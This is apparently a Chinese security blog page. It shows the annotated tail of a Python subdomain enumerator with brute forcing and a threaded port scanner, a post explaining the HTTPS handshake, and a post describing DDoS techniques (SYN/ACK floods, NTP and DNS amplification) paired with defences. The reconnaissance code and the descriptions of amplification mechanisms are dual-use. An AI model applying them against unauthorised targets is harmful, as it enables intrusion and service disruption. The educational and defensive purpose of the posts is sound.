class="function"><span class="keyword">def</span> <span class="title">extract_domains</span><span class="params">(self, resp)</span>:</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            subdomains = json.loads(resp)</span><br><span class="line">            <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">                <span class="keyword">if</span> subdomain <span class="keyword">not</span> <span class="keyword">in</span> self.subdomains <span class="keyword">and</span> subdomain != self.domain:</span><br><span class="line">                    <span class="keyword">if</span> self.verbose:</span><br><span class="line">                        self.print_(<span class="string">"%s%s: %s%s"</span> % (R, self.engine_name, W, subdomain))</span><br><span class="line">                    self.subdomains.append(subdomain.strip())</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 端口扫描</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">portscan</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, subdomains, ports)</span>:</span></span><br><span class="line">        self.subdomains = subdomains</span><br><span class="line">        self.ports = ports</span><br><span class="line">        self.threads = <span class="number">20</span></span><br><span class="line">        self.lock = threading.BoundedSemaphore(value=self.threads)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">port_scan</span><span class="params">(self, host, ports)</span>:</span></span><br><span class="line">        openports = []</span><br><span class="line">        self.lock.acquire()</span><br><span class="line">        <span class="keyword">for</span> port <span class="keyword">in</span> ports:</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">                s.settimeout(<span class="number">2</span>)</span><br><span class="line">                result = s.connect_ex((host, int(port)))</span><br><span class="line">                <span class="keyword">if</span> result == <span class="number">0</span>:</span><br><span class="line">                    openports.append(port)</span><br><span class="line">                s.close()</span><br><span class="line">            <span class="keyword">except</span> Exception:</span><br><span class="line">                <span class="keyword">pass</span></span><br><span class="line">        self.lock.release()</span><br><span class="line">        <span class="keyword">if</span> len(openports) &gt; <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">"%s%s%s - %sFound open ports:%s %s%s%s"</span> % (G, host, W, R, W, Y, <span class="string">', '</span>.join(openports), W))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">for</span> subdomain <span class="keyword">in</span> self.subdomains:</span><br><span class="line">            t = threading.Thread(target=self.port_scan, args=(subdomain, self.ports))</span><br><span class="line">            t.start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(domain, threads, savefile, ports, silent, verbose, enable_bruteforce, engines)</span>:</span></span><br><span class="line">    bruteforce_list = set()</span><br><span class="line">    search_list = set()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 判断平台</span></span><br><span class="line">    <span class="keyword">if</span> is_windows:</span><br><span class="line">        subdomains_queue = list()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        subdomains_queue = multiprocessing.Manager().list()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Check Bruteforce Status</span></span><br><span class="line">    <span class="comment"># 默认开启爆破</span></span><br><span class="line">    <span class="keyword">if</span> enable_bruteforce <span class="keyword">or</span> enable_bruteforce <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        enable_bruteforce = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Validate domain</span></span><br><span class="line">    domain_check = re.compile(<span class="string">"^(http|https)?[a-zA-Z0-9]+([\-\.]&#123;1&#125;[a-zA-Z0-9]+)*\.[a-zA-Z]&#123;2,&#125;$"</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> domain_check.match(domain):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">            print(R + <span class="string">"Error: Please enter a valid domain"</span> + W)</span><br><span class="line">        <span class="keyword">return</span> []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 加上默认协议</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> domain.startswith(<span class="string">'http://'</span>) <span class="keyword">or</span> <span class="keyword">not</span> domain.startswith(<span class="string">'https://'</span>):</span><br><span class="line">        domain = <span class="string">'http://'</span> + domain</span><br><span class="line"></span><br><span class="line">    parsed_domain = urlparse.urlparse(domain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">        print(B + <span class="string">"[-] Enumerating subdomains now for %s"</span> % parsed_domain.netloc + W)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> verbose <span class="keyword">and</span> <span class="keyword">not</span> silent:</span><br><span class="line">        print(Y + <span class="string">"[-] verbosity is enabled, will show the subdomains results in realtime"</span> + W)</span><br><span class="line"></span><br><span class="line">    supported_engines = &#123;<span class="string">'baidu'</span>: BaiduEnum,</span><br><span class="line">                         <span class="string">'yahoo'</span>: YahooEnum,</span><br><span class="line">                         <span class="string">'google'</span>: GoogleEnum,</span><br><span class="line">                         <span class="string">'bing'</span>: BingEnum,</span><br><span class="line">                         <span class="string">'ask'</span>: AskEnum,</span><br><span class="line">                         <span class="string">'netcraft'</span>: NetcraftEnum,</span><br><span class="line">                         <span class="string">'dnsdumpster'</span>: DNSdumpster,</span><br><span class="line">                         <span class="string">'virustotal'</span>: Virustotal,</span><br><span class="line">                         <span class="string">'threatcrowd'</span>: ThreatCrowd,</span><br><span class="line">                         <span class="string">'ssl'</span>: CrtSearch,</span><br><span class="line">                         <span class="string">'passivedns'</span>: PassiveDNS</span><br><span class="line">                         &#125;</span><br><span class="line"></span><br><span class="line">    chosenEnums = []</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 默认引擎</span></span><br><span class="line">    <span class="keyword">if</span> engines <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        chosenEnums = [</span><br><span class="line">            BaiduEnum, YahooEnum, GoogleEnum, BingEnum, AskEnum,</span><br><span class="line">            NetcraftEnum, DNSdumpster, Virustotal, ThreatCrowd,</span><br><span class="line">            CrtSearch, PassiveDNS</span><br><span class="line">        ]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        engines = engines.split(<span class="string">','</span>)</span><br><span class="line">        <span class="keyword">for</span> engine <span class="keyword">in</span> engines:</span><br><span class="line">            <span class="keyword">if</span> engine.lower() <span class="keyword">in</span> supported_engines:</span><br><span class="line">                chosenEnums.append(supported_engines[engine.lower()])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Start the engines enumeration</span></span><br><span class="line">    <span class="comment"># 构造列表，里面有构造好的类</span></span><br><span class="line">    enums = [enum(domain, [], q=subdomains_queue, silent=silent, verbose=verbose) <span class="keyword">for</span> enum <span class="keyword">in</span> chosenEnums]</span><br><span class="line">    <span class="comment"># 多线程</span></span><br><span class="line">    <span class="keyword">for</span> enum <span class="keyword">in</span> enums:</span><br><span class="line">        enum.start()</span><br><span class="line">    <span class="keyword">for</span> enum <span class="keyword">in</span> enums:</span><br><span class="line">        enum.join()</span><br><span class="line"></span><br><span class="line">    subdomains = set(subdomains_queue)</span><br><span class="line">    <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">        search_list.add(subdomain)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> enable_bruteforce:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">            print(G + <span class="string">"[-] Starting bruteforce module now using subbrute.."</span> + W)</span><br><span class="line">        record_type = <span class="literal">False</span></span><br><span class="line">        path_to_file = os.path.dirname(os.path.realpath(__file__))</span><br><span class="line">        subs = os.path.join(path_to_file, <span class="string">'subbrute'</span>, <span class="string">'names.txt'</span>)</span><br><span class="line">        resolvers = os.path.join(path_to_file, <span class="string">'subbrute'</span>, <span class="string">'resolvers.txt'</span>)</span><br><span class="line">        process_count = threads</span><br><span class="line">        output = <span class="literal">False</span></span><br><span class="line">        json_output = <span class="literal">False</span></span><br><span class="line">        <span class="comment"># 开始爆破</span></span><br><span class="line">        bruteforce_list = subbrute.print_target(parsed_domain.netloc, record_type, subs, resolvers, process_count, output, json_output, search_list, verbose)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 合并去重</span></span><br><span class="line">    subdomains = search_list.union(bruteforce_list)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> subdomains:</span><br><span class="line">        subdomains = sorted(subdomains, key=subdomain_sorting_key)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> savefile:</span><br><span class="line">            write_file(savefile, subdomains)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">            print(Y + <span class="string">"[-] Total Unique Subdomains Found: %s"</span> % len(subdomains) + W)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ports:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> silent:</span><br><span class="line">                print(G + <span class="string">"[-] Start port scan now for the following ports: %s%s"</span> % (Y, ports) + W)</span><br><span class="line">            ports = ports.split(<span class="string">','</span>)</span><br><span class="line">            pscan = portscan(subdomains, ports)</span><br><span class="line">            pscan.run()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">elif</span> <span class="keyword">not</span> silent:</span><br><span class="line">            <span class="keyword">for</span> subdomain <span class="keyword">in</span> subdomains:</span><br><span class="line">                print(G + subdomain + W)</span><br><span class="line">    <span class="keyword">return</span> subdomains</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">interactive</span><span class="params">()</span>:</span></span><br><span class="line">    args = parse_args()</span><br><span class="line">    domain = args.domain</span><br><span class="line">    threads = args.threads</span><br><span class="line">    savefile = args.output</span><br><span class="line">    ports = args.ports</span><br><span class="line">    enable_bruteforce = args.bruteforce</span><br><span class="line">    verbose = args.verbose</span><br><span class="line">    engines = args.engines</span><br><span class="line">    <span class="keyword">if</span> verbose <span class="keyword">or</span> verbose <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        verbose = <span class="literal">True</span></span><br><span class="line">    banner()</span><br><span class="line">    res = main(domain, threads, savefile, ports, silent=<span class="literal">False</span>, verbose=verbose, enable_bruteforce=enable_bruteforce, engines=engines)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    interactive()</span><br><span class="line"><span class="comment"># silent : 所有信息不输出</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># enumratorBaseThreaded(multiprocessing.Process, enumratorBase)作为父类被继承到各种引擎子类里, 每个引擎根据特点重写enumratorBase里的方法，然后enumratorBaseThreaded里的run()调用</span></span><br><span class="line"><span class="comment"># enumratorBase里的enumerate, enumerate调用子类里重写的generate_query</span></span><br></pre></td></tr></table></figure>
      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://j1nse.cool/2019/04/18/https/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="j1nse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="j1nse's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/18/https/" class="post-title-link" itemprop="url">https</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2019-04-18 20:18:03 / 修改时间：20:46:30" itemprop="dateCreated datePublished" datetime="2019-04-18T20:18:03+08:00">2019-04-18</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>面试问到原理了，佛了，安全岗面试真知识面真🐔儿广，还是自己太菜了</p>
<p><img src="https://user-gold-cdn.xitu.io/2018/1/5/160c5b10d3f27e00?imageView2/0/w/1280/h/960/format/webp/ignore-error/1" alt=""></p>
<ol>
<li>客户端发起HTTPS请求<br>这个没什么好说的，就是用户在浏览器里输入一个HTTPS网址，然后连接到服务端的443端口。</li>
<li>服务端的配置<br>采用HTTPS协议的服务器必须要有一套数字证书，可以自己制作，也可以向组织申请。区别就是自己颁发的证书需要客户端验证通过，才可以继续访问，而使用受信任的公司申请的证书则不会弹出提示页面。这套证书其实就是一对公钥和私钥。如果对公钥不太理解，可以想象成一把钥匙和一个锁头，只是世界上只有你一个人有这把钥匙，你可以把锁头给别人，别人可以用这个锁把重要的东西锁起来，然后发给你，因为只有你一个人有这把钥匙，所以只有你才能看到被这把锁锁起来的东西。</li>
<li>传送证书<br>这个证书其实就是公钥，只是包含了很多信息，如证书的颁发机构，过期时间等等。</li>
<li>客户端解析证书<br>这部分工作是由客户端的SSL/TLS来完成的，首先会验证公钥是否有效，比如颁发机构，过期时间等等，如果发现异常，则会弹出一个警示框，提示证书存在的问题。如果证书没有问题，那么就生成一个<strong><em>随机值</em></strong>。然后用证书（也就是公钥）对这个随机值进行加密。就好像上面说的，把随机值用锁头锁起来，这样除非有钥匙，不然看不到被锁住的内容。</li>
<li>传送加密信息<br>这部分传送的是用证书加密后的随机值，目的是让服务端得到这个随机值，以后客户端和服务端的通信就可以通过这个随机值来进行加密解密了。</li>
<li>服务端解密信息<br>服务端用私钥解密后，得到了客户端传过来的随机值，然后把内容通过该随机值进行对称加密，将信息和私钥通过某种算法混合在一起，这样除非知道私钥，不然无法获取内容，而正好客户端和服务端都知道这个私钥，所以只要加密算法够彪悍，私钥够复杂，数据就够安全。</li>
<li>传输加密后的信息<br>这部分信息就是服务端用私钥加密后的信息，可以在客户端用随机值解密还原。</li>
<li>客户端解密信息<br>客户端用之前生产的私钥解密服务端传过来的信息，于是获取了解密后的内容。整个过程第三方即使监听到了数据，也束手无策。</li>
</ol>
<p>上述过程完成密钥协商，后续都用协商好的密钥来进行对称加密(速度快)来进行通信。</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://juejin.im/post/5a4f4884518825732b19a3ce" target="_blank" rel="noopener">https://juejin.im/post/5a4f4884518825732b19a3ce</a></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://j1nse.cool/2019/04/18/ddos/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="j1nse">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="j1nse's blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2019/04/18/ddos/" class="post-title-link" itemprop="url">ddos</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2019-04-18 17:16:36" itemprop="dateCreated datePublished" datetime="2019-04-18T17:16:36+08:00">2019-04-18</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2019-04-19 10:24:58" itemprop="dateModified" datetime="2019-04-19T10:24:58+08:00">2019-04-19</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/web%E5%AE%89%E5%85%A8/" itemprop="url" rel="index"><span itemprop="name">web安全</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="攻击来源"><a href="#攻击来源" class="headerlink" title="攻击来源"></a>攻击来源</h2><p>高性能服务器配合发包软件<br>可联网的设备(如打印机、摄像头、电视等等)<br>移动设备(数量多，增长速度快，其高性能利于组建僵尸网络)<br>个人PC(存在漏洞的PC或一些黑客迷自愿成为DDOS一员)<br>骇客控制的僵尸网络(僵尸网络又分为IRC型、HTTP型、P2P型)</p>
<h2 id="流量特点"><a href="#流量特点" class="headerlink" title="流量特点"></a>流量特点</h2><p>IP地址随机或固定某些IP段随机<br>没有完整完成三次握手<br>地址多数是伪造的<br>请求数量大、快</p>
<h2 id="DDOS原因"><a href="#DDOS原因" class="headerlink" title="DDOS原因"></a>DDOS原因</h2><p>带宽上限<br>协议缺陷<br>设备性能上限<br>应用性能上限<br>系统性能上限</p>
<p>闲的蛋疼</p>
<h2 id="攻击类型及防御"><a href="#攻击类型及防御" class="headerlink" title="攻击类型及防御"></a>攻击类型及防御</h2><h3 id="Smurf攻击"><a href="#Smurf攻击" class="headerlink" title="Smurf攻击"></a>Smurf攻击</h3><p>攻击者向网关发送ICMP请求包，并将该ICMP请求报文的源地址伪造成受害主机IP地址，目的地址为广播地址。路由器在接受到该数据包，发现目的地址是广播地址，就会将该数据包广播出去，局域网内所有的存活主机都会受到一个ICMP请求包，源地址是受害主机IP。接下来受害主机就会收到该网络内所有主机发来的ICMP应答报文，通过大量返回的ICMP应答报文来淹没受害主机，最终导致网络阻塞，受害主机崩溃。下面是smurf攻击示意图<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125508-19d8d0a2-f430-1.png" alt=""></p>
<h4 id="防护方案"><a href="#防护方案" class="headerlink" title="防护方案"></a>防护方案</h4><p>禁止路由器广播ICMP请求包；禁止操作系统对广播发出的ICMP请求包做出响应；配置防火墙静止来自你所处网络外部的ping包</p>
<h3 id="TearDrop攻击"><a href="#TearDrop攻击" class="headerlink" title="TearDrop攻击"></a>TearDrop攻击</h3><p>在了解这种攻击之前，需要先知道什么是IP fragmentation（数据包分片）。数据在网络中传输必定会产生数据包被分片，因为每种网络都有不同的最大单个数据包的大小，也就是常说的MTU（Maximum Transmission Unit，最大传输单元）。当要传输的数据超过你要通信的那台主机所处网络的MTU时，数据包就会被分片进行传输，然后在到达目的地再重新组装成原来的数据包，下面是数据包分片重组过程<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125509-1a6de50c-f430-1.jpeg" alt=""><br>TearDrop攻击，就是通过设置错误的片偏移，使得数据包到达目的地时，服务器无法重新组合数据包，因为数据包的组合是通过片偏移来组装的，最终导致崩溃。对比一下正常IP数据包和错误IP数据包<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125511-1b3ea02a-f430-1.png" alt=""><br>这种攻击主要对旧的windows版本和Linux版本有效，防护的话，可以检测发来的数据包片偏移是否合法，如果合法在组装，不合法直接丢弃。</p>
<h3 id="Land-Attack"><a href="#Land-Attack" class="headerlink" title="Land Attack"></a>Land Attack</h3><p>攻击者发动Land Attack攻击时，需要先发出一个SYN数据包，并将数据包的源IP与目的IP都设置成要攻击的目标IP，这样目标在接收到SYN数据包后，会根据源IP回应一个SYN+ACK数据包，即和自己建立一个空连接，然后到达idel超时时间时，才会释放这个连接。攻击者发送大量这样的数据包，从而耗尽目标的TCP连接池，最终导致拒绝服务。攻击过程如下<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125511-1bbb6178-f430-1.png" alt=""></p>
<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><p>这种攻击对早期系统有效。通过设置防火墙和路由规则，检测源IP与目的IP相同的数据包，丢弃、过滤这种数据包。</p>
<h3 id="SYN-FLOOD攻击"><a href="#SYN-FLOOD攻击" class="headerlink" title="SYN FLOOD攻击"></a>SYN FLOOD攻击</h3><p>SYN FLOOD攻击是在TCP三次握手过程中产生的。攻击者通过发送大量伪造的带有SYN标志位的TCP报文，与目标主机建立了很多虚假的半开连接，在服务器返回SYN+ACK数据包后，攻击者不对其做出响应，也就是不返回ACK数据包给服务器，这样服务器就会一直等待直到超时。这种攻击方式会使目标服务器连接资源耗尽、链路堵塞，从而达到拒绝服务的目的。SYN FLOOD攻击图示如下<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125512-1c2e486e-f430-1.jpeg" alt=""></p>
<h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><p>SYNCheck：使用防护设备，3次握手变成了6次握手，由防护设备检测SYN请求是否合法，通过后再由防护设备将报文转发给服务器，后续报文仍由防护设备代理。<br>Micro blocks：管理员可以在内存中为每个SYN请求创建一个小索引(小于16字节)，而不必把整个连接对象存入内存。<br>RST cookies：在客户端发起第一个SYN请求后，服务器故意回应一个错误的SYN+ACK报文。如果合法用户收到这个报文，就会给服务器响应RST报文。当服务器收到这个报文时，就将这个主机的IP记录进合法IP列表，下次该主机发起SYN请求时，就可以直接通过了。<br>STACK tweaking：管理员可以调整TCP堆栈以减缓SYN泛洪攻击的影响。这包括减小超时时间，等到堆栈存释内放时再分配连接，否则就随机性地删除传入的连接。</p>
<h3 id="ACK-FLOOD攻击"><a href="#ACK-FLOOD攻击" class="headerlink" title="ACK FLOOD攻击"></a>ACK FLOOD攻击</h3><p>ACK FLOOD攻击是利用TCP三次握手过程。这里可以分为两种。</p>
<p>第一种：攻击者伪造大量的SYN+ACK包发送给目标主机，目标主机每收到一个SYN+ACK数据包时，都会去自己的TCP连接表中查看有没有与ACK的发送者建立连接 ，如果有则发送ACK包完成TCP连接，如果没有则发送ACK+RST 断开连接。但是在查询过程中会消耗一定的CUP计算资源。如果瞬间收到大量的SYN+ACK数据包，将会消耗服务器的大量cpu资源，导致正常的连接无法建立或增加延迟，甚至造成服务器瘫痪、死机。<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125513-1c9c6880-f430-1.png" alt=""></p>
<p>第二种：利用TCP三次握手的ACK+SYN应答，攻击者向不同的服务器发送大量的SYN请求，这些SYN请求数据包的源IP均为受害主机IP，这样就会有大量的SYN+ACK应答数据包发往受害主机，从而占用目标的网络带宽资源，形成拒绝服务。<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125514-1d23747e-f430-1.png" alt=""></p>
<p>通常DDOS攻击会将ACK flood与SYN flood结合在一起，从而扩大威力。</p>
<h4 id="防御方案"><a href="#防御方案" class="headerlink" title="防御方案"></a>防御方案</h4><p>参考如下：采用CDN进行流量稀释；避免服务器IP暴露在公网上；通过限速或动态指纹的方式；利用对称性判断来分析出是否有攻击存在；在连续收到用户发送的ACK包时，中断回话，让其重连。</p>
<h3 id="UDP-FLOOD攻击"><a href="#UDP-FLOOD攻击" class="headerlink" title="UDP FLOOD攻击"></a>UDP FLOOD攻击</h3><p>UDP（User Datagram Protocol，用户数据报协议），是一种无连接和无状态的网络协议，UDP不需要像TCP那样进行三次握手，运行开销低，不需要确认数据包是否成功到达目的地。这就造成UDP泛洪攻击不但效率高，而且还可以在资源相对较少的情况下执行。UDP FLOOD可以使用小数据包(64字节)进行攻击,也可以使用大数据包(大于1500字节,以太网MTU为1500字节)进行攻击。大量小数据包会增大网络设备处理数据包的压力；而对于大数据包，网络设备需要进行分片、重组，最终达到的效果就是占用网络传输接口的带宽、网络堵塞、服务器响应慢等等。<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125515-1da5b93e-f430-1.png" alt=""></p>
<h4 id="防御方案-1"><a href="#防御方案-1" class="headerlink" title="防御方案"></a>防御方案</h4><p>限制每秒钟接受到的流量(可能产生误判)；通过动态指纹学习(需要攻击发生一定时间)，将非法用户加入黑名单。</p>
<h3 id="NTP放大攻击"><a href="#NTP放大攻击" class="headerlink" title="NTP放大攻击"></a>NTP放大攻击</h3><p>NTP(Network Time Protocol，网络时间协议)，是用来使计算机网络时间同步化的一种协议，它可以使计算机与时钟源进行同步化并提供高精度的时间校正，使用UDP123端口进行通信。通常在NTP服务器上会有一些调试接口，而利用这些接口中的monlist请求，就可触发放大攻击。当主机向NTP服务器发送monlist查询请求时，NTP服务器会将与之进行时间同步的最后600个IP地址返回。所以攻击者只需要将源地址伪造为受害主机的IP，向NTP服务器发送一个monlist查询请求包，受害主机就会收到大量的UDP响应包。这种攻击在放大攻击里，危害相对较大。下面是NTP放大攻击示意图<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125515-1e29e222-f430-1.png" alt=""><br>总结一下这种攻击产生的原因，请求与响应数据包不等价；UDP协议的通信模糊性（无数据传输确认机制）；以及NTP服务器的无认证机制。</p>
<h4 id="防御方案-2"><a href="#防御方案-2" class="headerlink" title="防御方案"></a>防御方案</h4><p>使用防 DDoS 设备进行清洗；加固并升级NTP服务器；在网络出口封禁 UDP 123 端口；通过网络层或者借助运营商实施 ACL 来防御；关闭现在 NTP 服务的 monlist 功能，在ntp.conf配置文件中增加<code>disable monitor</code>选项。</p>
<h3 id="DNS放大攻击"><a href="#DNS放大攻击" class="headerlink" title="DNS放大攻击"></a>DNS放大攻击</h3><p>DNS(Domain Name System，域名系统)，由于使用IP地址来记忆各个网站比较困难，所以就产生了使用主机名称来表示对应的服务器，主机名称通过域名解析的过程转换成IP地址。下面来看一下DNS报文格式，以便了解攻击发生在何处。<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125516-1e91243c-f430-1.png" alt=""><br>报文首部格式<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125517-1ee32f70-f430-1.png" alt=""><br>报文首部各字段含义如下，其中绿色高亮是攻击点之一，之后会分析<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125518-1f7aa12a-f430-1.png" alt=""><br>下面是问题记录中查询类型可设置的值，我们发现最后一个ANY类型会请求所有记录，这也是一个攻击点<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125519-1ffa1144-f430-1.png" alt=""><br>DNS查询可分为递归查询和迭代查询，下面是DNS迭代查询图<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125519-2078f8c4-f430-1.png" alt=""><br>再来看DNS递归查询图<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125520-20f75390-f430-1.jpeg" alt=""><br>从DNS数据包结构以及DNS递归查询过程，我们就可以大致分析出攻击原理。首先，攻击者向僵尸网络发出指令，使僵尸网络中的每一台主机均发出一个伪造源地址的DNS查询请求包，这些请求包查询类型设置为ANY，因为这种类型会请求所有的记录，这些记录会在返回的响应包中，也就是说这种数据包的大小较其他类型是最大的。接着查询类型设为递归查询，为什么不是迭代查询呢，仔细看两种查询的过程图可发现，如果迭代查询第一个请求的DNS服务器没有查询到结果，那么第一个请求的服务器会返回另一个DNS服务器IP，让请求主机向这个IP去继续查询，然而攻击者的数据包源地址是伪造的，所以并不会发起第二次查询，因为第一次查询根本就不是它发起的；而递归查询却是在查询到结果之后，才返回给查询请求发起者。利用这两个特点，攻击者就可以成功发起DNS放大攻击。这种普通的查询请求可以将攻击流量放大2~10倍，如果想增大攻击倍数，可以使用RFC 2671中定义的DNS拓展机制EDNS0。未使用EDNS0时，若响应包大小小于512字节，就使用UDP封装数据；若响应包大小超过512字节，就使用TCP连接或者服务器截断响应报文，丢弃超过512字节的部分，并把TC位置1。这两种方式都不利于进行DNS放大攻击。然而在开启EDNS0机制后，增加了OPT RR字段，这两个字段包含了能够处理的最大UDP报文大小信息，所以攻击者将这个信息设置的很大，服务器就会根据这个信息生成响应报文。最后看一下DNS放大攻击演示图<br><img src="https://xianzhi.aliyun.com/forum/media/upload/picture/20180108125521-21747d7a-f430-1.jpeg" alt=""></p>
<h4 id="防御-2"><a href="#防御-2" class="headerlink" title="防御"></a>防御</h4><p>可以参考以下几点：联系ISP清洗上游流量；DNS服务器只对可信域内提供服务，限制对域外用户提供DNS解析服务；对单个IP的查询速率做限制；拥有足够的带宽承受小规模攻击；关闭DNS服务器的递归查询；利用防火墙等对ANY Request进行过滤。</p>
